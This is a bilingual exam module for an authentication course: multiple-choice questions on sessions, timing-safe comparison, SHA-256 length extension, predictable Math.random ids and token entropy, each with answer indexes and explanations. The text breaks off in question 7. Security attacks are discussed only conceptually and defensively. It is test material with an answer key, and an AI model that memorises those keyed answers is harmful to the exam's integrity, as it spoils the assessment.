/**
 * Authentication — Final Exam (FE): 50 câu trắc nghiệm phủ cả 13 mục (s00–s12).
 *
 * Đề tự soạn, bám sát `content/courses/authentication/s00…s12`. Có cả câu lý
 * thuyết lẫn câu đọc mã và đọc số đo; MỌI con số, mã lỗi, độ dài chuỗi và giá
 * trị băm trong đề đều CHẠY THẬT trên **Node.js v22.21.0** (macOS, darwin
 * arm64), với `jsonwebtoken@9.0.3` và `bcryptjs@2.4.3` lấy từ chính
 * `node_modules` của kho này — không phải trí nhớ.
 *
 * Số câu mỗi chương: Mục 0 · 2 · Ch1 · 4 · Ch2 · 5 · Ch3 · 4 · Ch4 · 5 ·
 * Ch5 · 4 · Ch6 · 4 · Ch7 · 4 · Ch8 · 5 · Ch9 · 4 · Ch10 · 3 · Ch11 · 3 ·
 * Ch12 · 3.  Tổng 50.
 *
 * ⚠️ BẢY CHỖ MÁY KHÁC GIÁO TRÌNH, đã đo lại và ĐỀ THEO MÁY. Không câu nào
 * dưới đây ra vào bảy chỗ ấy:
 *
 *   • Bài 1.4 in `1b4f0e9851971998…` là kết quả của `sha256('xin chao')`.
 *     Đo thật: giá trị đúng là `f9b197ffdaa45e4fb217f865fe3a2bd8…`. Đề không
 *     hỏi giá trị băm cụ thể của chuỗi đó.
 *   • Bài 2.2 gọi `crypto.scrypt(pw, salt, 64, { N: 2**15, r: 8, p: 1 })` mà
 *     KHÔNG đặt `maxmem`. Trên Node 22 lệnh đó NÉM
 *     `ERR_CRYPTO_INVALID_SCRYPT_PARAMS` — trần mặc định là 32 MB, mà
 *     128·N·r đã đúng 32 MiB. Đề không hỏi vào đoạn mã ấy.
 *   • Bài 2.2 nói `'mật khẩu rất dài của tôi'` dài 33 byte UTF-8. Đo thật:
 *     **34**. Đề hỏi cơ chế cắt cụt 72 BYTE, không hỏi con số 33.
 *   • Bài 2.3 nói `Buffer.from('mật'.normalize('NFD'),'utf8').length` là 8.
 *     Đo thật: **7** (NFC là 5, đúng như giáo trình).
 *   • Bài 4.1 nói token mẫu dài 268 ký tự và in phần payload có khoá `role`.
 *     Đo thật: token dài **235** ký tự (36 + 154 + 43) và khoá trong payload
 *     là `vaiTro`. Đề dùng token do chính đề đúc ra, không dùng token ấy.
 *   • Bài 4.3 nói `new Date(Math.floor(Date.now()/1000) + 900)` in ra
 *     `1970-01-01T00:29:16.000Z`. Đo thật nó rơi vào **21/01/1970** — con số
 *     phụ thuộc thời điểm chạy. Đề hỏi HƯỚNG của cái bẫy (giây đối lại
 *     mili-giây), không hỏi chuỗi ngày cụ thể.
 *   • Bài 12.2 nói cửa sổ TOTP ±1 bước "chịu được lệch từ −60s tới +59s".
 *     Đo thật: khoảng chấp nhận phụ thuộc vị trí của T trong bước — với
 *     `T mod 30 = 0` là [−30, +59], với `T mod 30 = 29` là [−59, +30] — nên
 *     khoảng BẢO ĐẢM cho mọi thời điểm chỉ là ±30 giây. Đề hỏi theo SỐ BƯỚC.
 *
 * ⚠️ MỘT CHỖ THƯ VIỆN ĐÃ ĐỔI SAU KHI GIÁO TRÌNH VIẾT. Bài 4.2 trình bày
 * `jwt.verify(token, publicKeyPem)` (không truyền `algorithms`) như đoạn mã
 * dính lỗ hổng lẫn lộn thuật toán. Đo thật trên `jsonwebtoken@9.0.3`: lời gọi
 * đó **ném `JsonWebTokenError: invalid algorithm`** — thư viện suy ra tập
 * thuật toán cho phép từ KIỂU KHOÁ, nên cú giả mạo RS256→HS256 kinh điển
 * không còn ăn với phiên bản này. Nguyên tắc thì không đổi (ghim thuật toán
 * bằng cấu hình của mình), nên câu 17 hỏi NGUYÊN TẮC chứ không hỏi "đoạn mã
 * này hôm nay có khai thác được không".
 *
 * Phân bố vị trí đáp án (kiểm bằng lệnh dưới): A 12 · B 13 · C 13 · D 12.
 *   node -e "import('./content/exams/AUTHENTICATION-FE.mjs').then(m=>{const d={};m.default.exams[0].questions.forEach(q=>q.correctIndexes.forEach(c=>d[c]=(d[c]||0)+1));console.log(d)})"
 *
 * Seed: node scripts/academy-seed-exam.mjs --file ./content/exams/AUTHENTICATION-FE.mjs --apply
 */
import { B, EX, code, c, mcq } from './_lib/authentication-exam-kit.mjs';

const INSTRUCTIONS =
  '<div class="ml-en">' +
  '<p><b>Final Exam</b> — 50 multiple-choice questions across all thirteen sections, from "HTTP forgets you between two requests" to "which chapter do I open when users say they are being logged out at random". Many questions show real code or a real measurement and ask you to explain it; every number in this paper came from actually running something, so read what is on the page rather than what you expect.</p>' +
  '<p>Three habits pay off here. First, separate the three gates: knowing who someone claims to be, proving it, and deciding what they may do are three different problems, and most expensive bugs live in the third. Second, ask of every value which side of the trust boundary it arrived from — a header, a query parameter and a claim inside an unverified token are all attacker input. Third, when a question offers a defence, ask what it does <em>not</em> stop: <code>HttpOnly</code>, <code>SameSite</code>, a slow hash and a second factor each close one door precisely and leave the neighbouring one open.</p>' +
  '<p>You can flag a question and come back to it. The timer auto-submits when it ends, and every question shows a bilingual explanation afterwards.</p>' +
  '</div>' +
  '<div class="ml-vi">' +
  '<p><b>Thi cuối khoá</b> — 50 câu trắc nghiệm phủ cả mười ba mục, từ "HTTP quên bạn giữa hai request" tới "gặp báo cáo bị đăng xuất ngẫu nhiên thì mở chương nào trước". Nhiều câu cho sẵn đoạn mã thật hoặc một số đo thật rồi hỏi bạn giải thích nó; mọi con số trong đề đều lấy từ việc chạy thật một thứ gì đó, nên hãy đọc thứ đang nằm trên trang giấy thay vì thứ bạn đoán trước.</p>' +
  '<p>Ba thói quen giúp ích ở đây. Một, tách bạch ba cái cổng: biết một người TỰ XƯNG là ai, CHỨNG MINH điều đó, và QUYẾT ĐỊNH họ được làm gì là ba bài toán khác nhau, và phần lớn lỗi đắt tiền nằm ở cái thứ ba. Hai, với mỗi giá trị hãy hỏi nó đi vào từ phía nào của ranh giới tin cậy — một header, một tham số truy vấn và một claim nằm trong token CHƯA kiểm chữ ký đều là đầu vào của kẻ tấn công. Ba, khi một câu đưa ra một biện pháp phòng thủ, hãy hỏi nó KHÔNG chặn được gì: <code>HttpOnly</code>, <code>SameSite</code>, một hàm băm chậm và một yếu tố thứ hai — mỗi thứ đóng đúng một cánh cửa và để ngỏ cánh bên cạnh.</p>' +
  '<p>Bạn có thể đánh dấu câu để quay lại sau. Hết giờ hệ thống tự nộp, và sau khi nộp mỗi câu đều có lời giải thích song ngữ.</p>' +
  '</div>';

export default {
  course: { slug: 'authentication' },
  exams: [
    {
      kind: 'FE',
      code: 'FE',
      source: 'SAMPLE',
      sortOrder: 4,
      title: B(
        'Final Exam — the whole Authentication course (50 questions)',
        'Thi cuối khoá — toàn bộ khoá Authentication (50 câu)',
      ),
      description: B(
        'Fifty multiple-choice questions covering all thirteen sections: the three problems hiding inside the word "login", bearer credentials and the primitives underneath them, passwords and slow hashing, sessions and cookie attributes, JWT from the inside, refresh rotation and revocation, the account lifecycle, TOTP and passkeys, OAuth 2.1 with OpenID Connect, RBAC, ABAC and multi-tenancy, the attacks ranked by how often they really happen, running the thing in production, and a method for working out what broke.',
        'Năm mươi câu trắc nghiệm phủ cả mười ba mục: ba bài toán nấp trong chữ "đăng nhập", tín vật mang theo và các nguyên hàm bên dưới, mật khẩu và hàm băm chậm, phiên và các thuộc tính cookie, mổ JWT từ bên trong, xoay vòng refresh và thu hồi, vòng đời tài khoản, TOTP và passkey, OAuth 2.1 với OpenID Connect, RBAC, ABAC và nhiều tenant, các cú tấn công xếp theo tần suất thật, vận hành nó trên production, và một phương pháp để tìm ra thứ gì đã hỏng.',
      ),
      durationMinutes: 60,
      totalPoints: 10,
      passMark: 5,
      shuffleQuestions: true,
      shuffleOptions: false,
      isPublished: true,
      instructions: INSTRUCTIONS,
      questions: [

        /* ── Mục 0 — bài toán, ba cái cổng, một login sai sáu chỗ (2 câu) ── */

        // q1 · đáp án 2
        mcq({
          prompt: B(
            'Two identical requests reach your server one second apart. Why can the second one not simply be recognised as coming from whoever sent the first?',
            'Hai request giống hệt nhau tới máy chủ của bạn cách nhau một giây. Vì sao request thứ hai không thể được nhận ra đơn giản là của người đã gửi request đầu?',
          ),
          options: [
            B(
              'Because the server would have to keep every past request in memory, and no realistic server has room for that',
              'Vì máy chủ sẽ phải giữ mọi request đã qua trong bộ nhớ, mà không máy chủ thực tế nào đủ chỗ cho việc đó',
            ),
            B(
              'Because browsers deliberately strip identifying information from repeat requests, as a privacy measure users cannot turn off',
              'Vì trình duyệt cố ý gỡ bỏ thông tin định danh khỏi các request lặp lại, như một biện pháp riêng tư mà người dùng không tắt được',
            ),
            B(
              'Because HTTP is stateless by design: each request must carry its own proof, and that property is what lets load balancers, CDNs and horizontal scaling work at all',
              'Vì HTTP vốn không có trạng thái theo thiết kế: mỗi request phải tự mang bằng chứng của nó, và chính tính chất đó mới khiến bộ cân bằng tải, CDN và việc nhân bản máy chủ chạy được',
            ),
            B(
              'It can, as long as the connection is kept alive: HTTP/1.1 keep-alive and HTTP/2 multiplexing bind a request to the previous one on the same socket',
              'Nhận ra được, miễn là giữ nguyên kết nối: keep-alive của HTTP/1.1 và multiplexing của HTTP/2 buộc một request vào request trước trên cùng một socket',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Statelessness is not a limitation the protocol failed to overcome — it is the property everything else is built on. A server that had to remember who you were could not be replaced by a second identical server behind a load balancer, and a CDN could not answer on its behalf. The price is that identity has to travel <em>inside every request</em>, which is what makes it a credential, and a credential is a thing that can be stolen, replayed and forgotten to expire. Option 4 is the tempting one and it is wrong in practice: a proxy, a retry, a second tab or a connection reset all break the association, so a connection is never a safe place to hang identity. Option 1 confuses memory with architecture, and option 2 describes nothing any browser does.',
            'Tính không-trạng-thái không phải một hạn chế mà giao thức chưa vượt qua được — nó là tính chất mà mọi thứ còn lại dựng lên trên đó. Một máy chủ buộc phải nhớ bạn là ai thì không thể thay bằng một máy chủ thứ hai y hệt đứng sau bộ cân bằng tải, và một CDN không thể trả lời thay nó. Cái giá là danh tính phải đi <em>bên trong từng request</em>, và chính điều đó biến nó thành một TÍN VẬT, mà tín vật là thứ có thể bị trộm, bị phát lại, và bị quên đặt hạn. Phương án 4 là cái hấp dẫn và nó sai trong thực tế: một proxy, một lượt thử lại, một tab thứ hai hay một lần đứt kết nối đều phá vỡ mối liên hệ ấy, nên một kết nối không bao giờ là chỗ an toàn để treo danh tính. Phương án 1 lẫn bộ nhớ với kiến trúc, còn phương án 2 mô tả một thứ không trình duyệt nào làm.',
          ),
        }),

        // q2 · đáp án 0
        mcq({
          prompt: B(
            'An authenticated user requests a resource that belongs to somebody else. Which status code is correct, and why does the other one cause a concrete problem?',
            'Một người dùng đã đăng nhập yêu cầu một tài nguyên thuộc về người khác. Mã trạng thái nào là đúng, và mã còn lại gây ra vấn đề cụ thể gì?',
          ),
          options: [
            B(
              '403, because the server knows who they are and the answer is still no; sending 401 tells the client its credential failed, so it clears the session and pushes the user into a login loop they cannot escape',
              '403, vì máy chủ BIẾT họ là ai và câu trả lời vẫn là không; gửi 401 tức là báo cho client rằng tín vật của nó hỏng, nên nó xoá phiên và đẩy người dùng vào một vòng lặp đăng nhập không thoát ra được',
            ),
            B(
              '401, because any refused request means the credential presented was not sufficient for what was asked, which is exactly what 401 is defined to mean',
              '401, vì mọi request bị từ chối đều nghĩa là tín vật đưa lên không đủ cho thứ vừa yêu cầu, mà đó đúng là ý nghĩa được định nghĩa của 401',
            ),
            B(
              'Either one, as long as the body carries a machine-readable error code; the status code is transport-level detail and clients should key off the body',
              'Cái nào cũng được, miễn là phần thân mang một mã lỗi máy đọc được; mã trạng thái chỉ là chi tiết ở tầng vận chuyển và client nên căn cứ vào phần thân',
            ),
            B(
              '400, because the request named a resource the caller has no relationship to, which makes the request itself malformed rather than merely refused',
              '400, vì request gọi tên một tài nguyên mà người gọi không có quan hệ gì, khiến chính cái request đó là méo mó chứ không chỉ là bị từ chối',
            ),
          ],
          correct: 0,
          explanation: EX(
            'The two codes answer two different gates. <b>401</b> means gate two failed: I do not know who you are, present a credential. <b>403</b> means gate two succeeded and gate three refused: I know exactly who you are and you may not have this. Clients are built on that distinction — an axios interceptor that refreshes on 401 and retries is standard, and firing it on a permission failure produces a refresh, a retry, another 403 read as 401, and eventually a logout. Option 3 is the plausible-sounding trap: every HTTP client in the world keys off the status line, and none of them parse your error body. Option 4 misreads 400, which is about a request the server cannot parse or validate, not one it can parse perfectly and refuse on policy. There is a real exception worth knowing: on an object-level check, answering <b>404</b> instead of 403 is often better still, because 403 confirms the record exists and turns the endpoint into an enumeration oracle.',
            'Hai mã trả lời hai cái cổng khác nhau. <b>401</b> nghĩa là cổng hai hỏng: tôi không biết bạn là ai, hãy đưa tín vật. <b>403</b> nghĩa là cổng hai qua rồi và cổng ba từ chối: tôi biết chính xác bạn là ai và bạn không được cái này. Các client được dựng trên đúng sự phân biệt đó — một bộ chặn của axios làm mới token khi gặp 401 rồi thử lại là chuyện tiêu chuẩn, và kích hoạt nó bằng một lỗi phân quyền sẽ sinh ra một lượt làm mới, một lượt thử lại, thêm một 403 nữa bị đọc thành 401, và cuối cùng là đăng xuất. Phương án 3 là cái bẫy nghe rất xuôi tai: mọi HTTP client trên đời đều căn cứ vào dòng trạng thái, và không cái nào đọc phần thân lỗi của bạn. Phương án 4 hiểu sai 400, vốn nói về một request máy chủ KHÔNG phân tích hay kiểm tra nổi, chứ không phải một request nó phân tích hoàn hảo rồi từ chối theo chính sách. Có một ngoại lệ thật đáng biết: ở phép kiểm cấp đối tượng, trả <b>404</b> thay cho 403 thường còn tốt hơn nữa, vì 403 xác nhận bản ghi đó có tồn tại và biến endpoint thành một cỗ máy dò danh sách.',
          ),
        }),

        /* ── Chương 1 — tín vật và các nguyên hàm (4 câu) ─────────────── */

        // q3 · đáp án 1
        mcq({
          prompt: B(
            'A codebase generates session ids with ' + c("Math.random().toString(36).slice(2)") + ', producing eleven-character strings such as ' + c('k3f9a1x7bqz2') + '. What is the effective security of that identifier?',
            'Một kho mã sinh id phiên bằng ' + c("Math.random().toString(36).slice(2)") + ', cho ra những chuỗi mười một ký tự kiểu ' + c('k3f9a1x7bqz2') + '. Độ an toàn thực tế của định danh đó là bao nhiêu?',
          ),
          options: [
            B(
              'About 56 bits, since eleven characters from a 36-symbol alphabet give 36^11 possibilities, which is comfortably above the usual floor',
              'Khoảng 56 bit, vì mười một ký tự lấy từ bảng 36 ký hiệu cho 36^11 khả năng, thoải mái nằm trên cái sàn thường dùng',
            ),
            B(
              'Effectively zero, because the generator is not cryptographic: an attacker who collects a few ids issued to their own account can recover the internal state and compute everybody else\'s, past and future',
              'Thực tế bằng không, vì bộ sinh không phải loại dùng cho mật mã: kẻ tấn công thu vài id cấp cho chính tài khoản của nó là khôi phục được trạng thái nội bộ và tính ra id của mọi người khác, cả quá khứ lẫn tương lai',
            ),
            B(
              'About 52 bits, the mantissa of the underlying double, which is weak but still far too large to search within the lifetime of a session',
              'Khoảng 52 bit, đúng phần định trị của số thực bên dưới, yếu nhưng vẫn quá lớn để dò hết trong vòng đời một phiên',
            ),
            B(
              'It depends on load: the values are seeded from the clock, so ids are only guessable when two sessions are created within the same millisecond',
              'Còn tuỳ tải: các giá trị gieo từ đồng hồ, nên id chỉ đoán được khi hai phiên được tạo trong cùng một mili-giây',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The question is not how many outputs exist, it is whether the next one can be predicted. V8 implements <code>Math.random</code> with xorshift128+, and the whole internal state is recoverable from a small number of consecutive outputs. That turns the attack from "guess a session id" into "register an account, collect a handful of ids the server hands me, then compute everyone else\'s" — including ones already issued. Options 1 and 3 both count possibilities, which is the right arithmetic applied to the wrong property: a predictable generator has no entropy from the attacker\'s point of view no matter how wide its range. Option 4 invents clock seeding. The fix is one import: <code>randomBytes(32).toString(\'base64url\')</code>, which is 43 characters and 256 bits from a CSPRNG.',
            'Câu hỏi không phải có bao nhiêu đầu ra, mà là đầu ra kế tiếp có đoán được không. V8 cài <code>Math.random</code> bằng xorshift128+, và toàn bộ trạng thái nội bộ khôi phục được từ một số ít đầu ra liên tiếp. Điều đó biến cú tấn công từ "đoán một id phiên" thành "đăng ký một tài khoản, thu vài cái id máy chủ tự trao cho tôi, rồi tính ra id của mọi người khác" — kể cả những cái đã cấp từ trước. Phương án 1 và 3 đều đếm số khả năng, tức là làm đúng phép tính nhưng áp vào sai tính chất: một bộ sinh đoán trước được thì dưới mắt kẻ tấn công nó có ĐỘ NGẪU NHIÊN BẰNG KHÔNG, bất kể tầm giá trị rộng tới đâu. Phương án 4 bịa ra chuyện gieo theo đồng hồ. Cách sửa gọn trong một dòng import: <code>randomBytes(32).toString(\'base64url\')</code>, dài 43 ký tự và mang 256 bit từ một CSPRNG.',
          ),
        }),

        // q4 · đáp án 3
        mcq({
          prompt: B(
            'A helper compares a submitted API key against the stored one. Measured on Node 22:' +
            code("const crypto = require('node:crypto');\ncrypto.timingSafeEqual(Buffer.from('abc'), Buffer.from('abcd'));") +
            'What happens, and what does that mean for the wrapper you write around it?',
            'Một hàm phụ so sánh khoá API gửi lên với khoá đã lưu. Đo thật trên Node 22:' +
            code("const crypto = require('node:crypto');\ncrypto.timingSafeEqual(Buffer.from('abc'), Buffer.from('abcd'));") +
            'Chuyện gì xảy ra, và điều đó có nghĩa gì với hàm bọc mà bạn viết quanh nó?',
          ),
          options: [
            B(
              'It returns false, having compared the first three bytes and then treated the missing fourth as a mismatch, so no wrapper is needed',
              'Nó trả về false, sau khi so ba byte đầu rồi coi byte thứ tư còn thiếu là một chỗ lệch, nên không cần hàm bọc nào',
            ),
            B(
              'It pads the shorter buffer with zero bytes and compares in constant time, which is why the function exists and why length never needs handling',
              'Nó đệm buffer ngắn hơn bằng các byte không rồi so hằng thời gian, đó là lý do hàm này tồn tại và là lý do không bao giờ phải xử lý độ dài',
            ),
            B(
              'It returns true, because the function compares only up to the length of its first argument, which is the documented behaviour and the reason argument order matters',
              'Nó trả về true, vì hàm chỉ so tới độ dài của tham số thứ nhất, đó là hành vi có ghi trong tài liệu và là lý do thứ tự tham số quan trọng',
            ),
            B(
              'It throws ' + c('RangeError [ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH]') + ', so a naive wrapper turns a length difference into an exception and leaks the very thing it was meant to hide',
              'Nó ném ' + c('RangeError [ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH]') + ', nên một hàm bọc ngây thơ sẽ biến một chỗ lệch độ dài thành một ngoại lệ và làm rò rỉ đúng thứ nó định che đi',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Run it and Node answers immediately: <code>RangeError [ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH]: Input buffers must have the same byte length</code>. The function refuses unequal lengths because comparing them in constant time is not possible — the length itself is a difference. That leaves you with a decision rather than a default. Usually the length is not secret at all: every session id you issue is the same length, so an explicit <code>a.length === b.length</code> check first, then the constant-time compare, is correct and honest. When the length genuinely is secret, hash both sides first — two SHA-256 digests are always 32 bytes, so the comparison never sees a length difference. Option 2 describes a helpful function that does not exist, and options 1 and 3 describe silent wrong answers, which would be worse than the throw: a security primitive that quietly returns the wrong result is the one failure mode you cannot test your way out of.',
            'Chạy thử và Node trả lời ngay: <code>RangeError [ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH]: Input buffers must have the same byte length</code>. Hàm này từ chối hai độ dài khác nhau vì so chúng trong hằng thời gian là chuyện không làm được — chính độ dài đã là một chỗ khác biệt. Thế nên bạn được giao một quyết định chứ không phải một mặc định. Thường thì độ dài chẳng bí mật gì: mọi id phiên bạn cấp đều cùng độ dài, nên kiểm <code>a.length === b.length</code> tường minh trước rồi mới so hằng thời gian là vừa đúng vừa thật thà. Khi độ dài thật sự là bí mật thì băm cả hai vế trước — hai chuỗi băm SHA-256 luôn dài 32 byte, nên phép so sánh không bao giờ nhìn thấy chỗ lệch độ dài. Phương án 2 mô tả một hàm tử tế không hề tồn tại, còn phương án 1 và 3 mô tả những câu trả lời sai trong im lặng, thứ còn tệ hơn cả việc ném lỗi: một nguyên hàm bảo mật lặng lẽ trả về kết quả sai là kiểu hỏng duy nhất mà bạn không thể kiểm thử để thoát ra.',
          ),
        }),

        // q5 · đáp án 0
        mcq({
          prompt: B(
            'A webhook receiver authenticates payloads with ' + c('sha256(SECRET + body)') + ' and compares the result to a header. The secret is 32 random bytes and the comparison is constant time. What is still wrong?',
            'Một bộ nhận webhook xác thực dữ liệu bằng ' + c('sha256(SECRET + body)') + ' rồi so kết quả với một header. Bí mật là 32 byte ngẫu nhiên và phép so sánh chạy hằng thời gian. Vậy vẫn còn sai ở đâu?',
          ),
          options: [
            B(
              'The construction is length-extendable: from the digest and the length of the secret alone, and without ever learning the secret, an attacker can compute a valid digest for the body plus padding plus anything they choose to append',
              'Cấu trúc này nối dài được: chỉ từ chuỗi băm và độ dài của bí mật, mà không hề biết chính cái bí mật, kẻ tấn công tính ra được một chuỗi băm hợp lệ cho phần thân cộng phần đệm cộng bất cứ thứ gì nó muốn nối thêm',
            ),
            B(
              'SHA-256 is too fast for this job; an attacker with a GPU recovers a 32-byte secret from one captured digest in a matter of hours',
              'SHA-256 quá nhanh cho việc này; kẻ tấn công có GPU khôi phục được một bí mật 32 byte từ một chuỗi băm bắt được trong vài giờ',
            ),
            B(
              'The digest is only 256 bits, which is below the collision resistance a signature needs, so two different bodies will eventually authenticate identically',
              'Chuỗi băm chỉ 256 bit, dưới mức kháng va chạm mà một chữ ký cần, nên rồi sẽ có hai phần thân khác nhau xác thực ra cùng một kết quả',
            ),
            B(
              'Concatenation makes the digest depend on encoding, so the same body serialised by two different clients produces two different digests and legitimate calls are rejected',
              'Phép nối làm chuỗi băm phụ thuộc vào cách mã hoá, nên cùng một phần thân do hai client khác nhau tuần tự hoá sẽ ra hai chuỗi băm khác nhau và các lời gọi chính đáng bị từ chối',
            ),
          ],
          correct: 0,
          explanation: EX(
            'This is a named attack, not a theoretical worry. SHA-256 is a Merkle-Damgård construction: the digest <em>is</em> the internal state after the last block, so anyone holding a digest can resume hashing from it. Knowing only <code>sha256(secret + body)</code> and the length of the secret, an attacker produces a valid tag for <code>body ‖ padding ‖ anything</code> — a webhook receiver is the perfect target for it, because the attacker controls the body, can send unlimited requests and gets a clean pass/fail signal. HMAC exists precisely to remove this, at no extra cost: <code>createHmac(\'sha256\', SECRET).update(body)</code>. Option 2 has the reasoning backwards — a fast hash is a problem for passwords, where the input space is small, and irrelevant for a 256-bit random key. Option 3 misstates the security level, and option 4 describes a real operational trap (always sign the raw body, never a re-serialised one) that is not what breaks this construction. SHA-3 and BLAKE2 are not length-extendable, so keyed BLAKE2 would also be sound; HMAC-SHA256 is simply the one with universal support.',
            'Đây là một cú tấn công có tên hẳn hoi, không phải một mối lo lý thuyết. SHA-256 là một cấu trúc Merkle-Damgård: chuỗi băm CHÍNH LÀ trạng thái nội bộ sau khối cuối, nên ai cầm chuỗi băm cũng băm tiếp được từ đó. Chỉ cần biết <code>sha256(secret + body)</code> và độ dài của bí mật, kẻ tấn công tạo ra được một cái nhãn hợp lệ cho <code>body ‖ đệm ‖ bất cứ gì</code> — và một bộ nhận webhook là đích ngắm hoàn hảo, vì kẻ tấn công điều khiển phần thân, gửi được vô hạn request, và nhận về một tín hiệu đạt/hỏng sạch sẽ. HMAC sinh ra đúng để xoá bỏ điều này, mà không tốn thêm gì: <code>createHmac(\'sha256\', SECRET).update(body)</code>. Phương án 2 lập luận ngược chiều — hàm băm nhanh là vấn đề với MẬT KHẨU, nơi không gian đầu vào bé, và không liên quan gì tới một khoá ngẫu nhiên 256 bit. Phương án 3 nói sai mức an toàn, còn phương án 4 mô tả một cái bẫy vận hành có thật (luôn ký phần thân THÔ, đừng ký bản đã tuần tự hoá lại) nhưng đó không phải thứ làm vỡ cấu trúc này. SHA-3 và BLAKE2 không nối dài được, nên BLAKE2 có khoá cũng vững; HMAC-SHA256 chỉ đơn giản là cái được hỗ trợ ở khắp nơi.',
          ),
        }),

        // q6 · đáp án 2
        mcq({
          prompt: B(
            'Measured on Node 22: ' + c("randomBytes(32).toString('base64url')") + ' is 43 characters, ' + c("randomBytes(16).toString('hex')") + ' is 32 characters, and ' + c('randomUUID()') + ' is 36 characters. Ordered by the number of random bits each one actually carries, from most to least, what is the order?',
            'Đo thật trên Node 22: ' + c("randomBytes(32).toString('base64url')") + ' dài 43 ký tự, ' + c("randomBytes(16).toString('hex')") + ' dài 32 ký tự, còn ' + c('randomUUID()') + ' dài 36 ký tự. Xếp theo số BIT NGẪU NHIÊN mà mỗi cái thật sự mang, từ nhiều xuống ít, thứ tự là gì?',
          ),
          options: [
            B(
              'The UUID first at 128 bits, then the hex string at 128, then the base64url string at 86 — length in characters is what limits each one',
              'UUID trước với 128 bit, rồi chuỗi hex 128 bit, rồi chuỗi base64url 86 bit — số ký tự là thứ giới hạn từng cái',
            ),
            B(
              'The UUID first at 144 bits, then the base64url string at 129, then the hex string at 128 — six bits per base64url character and four per hex character',
              'UUID trước với 144 bit, rồi chuỗi base64url 129 bit, rồi chuỗi hex 128 bit — sáu bit mỗi ký tự base64url và bốn bit mỗi ký tự hex',
            ),
            B(
              'base64url at 256 bits, then hex at 128, then the UUID at 122 — a UUIDv4 spends six of its 128 bits on the fixed version and variant markers',
              'base64url 256 bit, rồi hex 128 bit, rồi UUID 122 bit — một UUIDv4 tiêu sáu trong số 128 bit của nó cho các dấu phiên bản và biến thể cố định',
            ),
            B(
              'They are equivalent: all three encode the same 128-bit value, and the differing lengths come only from the alphabet each encoding uses',
              'Cả ba tương đương: chúng đều mã hoá cùng một giá trị 128 bit, và độ dài khác nhau chỉ do bảng chữ mà mỗi cách mã hoá dùng',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Count the source bytes, not the output characters. <code>randomBytes(32)</code> is 32 bytes, so 256 bits, printed as 43 base64url characters at six bits each. <code>randomBytes(16)</code> is 16 bytes, so 128 bits, printed as 32 hex characters at four bits each — the hex string is always twice the byte count, which is exactly why it looks stronger than it is. <code>randomUUID()</code> generates a version 4 UUID: 128 bits of which four are the version nibble and two are the variant, leaving <b>122</b> random bits inside 36 characters, most of which are hyphens and format. All three are past OWASP\'s 64-bit floor for a session id, so the practical ranking is about headroom rather than adequacy. Two habits follow: read entropy from the byte count rather than the string, and never use UUIDv1, which embeds a timestamp and a MAC address and is not random at all.',
            'Hãy đếm số BYTE nguồn, đừng đếm số ký tự đầu ra. <code>randomBytes(32)</code> là 32 byte, tức 256 bit, in ra thành 43 ký tự base64url, mỗi ký tự sáu bit. <code>randomBytes(16)</code> là 16 byte, tức 128 bit, in ra thành 32 ký tự hex, mỗi ký tự bốn bit — chuỗi hex luôn dài gấp đôi số byte, và đó đúng là lý do nó TRÔNG mạnh hơn thực tế. <code>randomUUID()</code> sinh một UUID phiên bản 4: 128 bit, trong đó bốn bit là nibble phiên bản và hai bit là biến thể, còn lại <b>122</b> bit ngẫu nhiên nằm trong 36 ký tự mà phần lớn là dấu gạch và khuôn dạng. Cả ba đều vượt cái sàn 64 bit của OWASP cho một id phiên, nên thứ hạng thực tế nói về khoảng dư chứ không nói về việc đủ hay không. Hai thói quen rút ra: đọc độ ngẫu nhiên từ số byte chứ đừng đọc từ chuỗi, và đừng bao giờ dùng UUIDv1, thứ nhúng cả dấu thời gian lẫn địa chỉ MAC vào và chẳng ngẫu nhiên chút nào.',
          ),
        }),

        /* ── Chương 2 — mật khẩu (5 câu) ───────────────────────────────── */

        // q7 · đáp án 1
        mcq({
          prompt: B(
            'A per-user salt is stored in the clear next to the hash. What does the salt buy, and what does it explicitly not buy?',
            'Một cái muối riêng cho từng người dùng được lưu ở dạng trần ngay cạnh chuỗi băm. Cái muối đó mua được gì, và rõ ràng KHÔNG mua được gì?',
          ),
          options: [
            B(
              'It buys secrecy for the hash and makes the digest unreadable without it; what it does not buy is protection against someone who steals the salt column as well',
              'Nó mua được sự bí mật cho chuỗi băm và khiến chuỗi băm không đọc được nếu thiếu nó; thứ nó không mua được là sự bảo vệ trước kẻ trộm luôn cả cột muối',
            ),
            B(
              'It kills precomputed tables and hides the fact that two users chose the same password; what it does not buy is any slowdown at all — cracking one user\'s hash still runs at full speed, and only the cost parameter changes that',
              'Nó giết chết các bảng tính sẵn và giấu đi việc hai người dùng chọn trùng mật khẩu; thứ nó không mua được là bất kỳ sự chậm lại nào — bẻ băm của MỘT người vẫn chạy hết tốc lực, và chỉ tham số chi phí mới đổi được điều đó',
            ),
            B(
              'It multiplies the attacker\'s work by the number of users, because each candidate password must now be tried once per row; what it does not buy is resistance to a dictionary of common passwords',
              'Nó nhân khối lượng công việc của kẻ tấn công lên bằng số người dùng, vì mỗi mật khẩu ứng viên nay phải thử một lần cho mỗi dòng; thứ nó không mua được là khả năng chống một từ điển các mật khẩu phổ biến',
            ),
            B(
              'It makes the hash function memory-hard, which is what removes the GPU advantage; what it does not buy is protection against a single targeted user, since their salt is known',
              'Nó khiến hàm băm trở nên tốn bộ nhớ, và đó là thứ triệt tiêu lợi thế của GPU; thứ nó không mua được là sự bảo vệ cho một người dùng bị nhắm riêng, vì muối của họ đã lộ',
            ),
          ],
          correct: 1,
          explanation: EX(
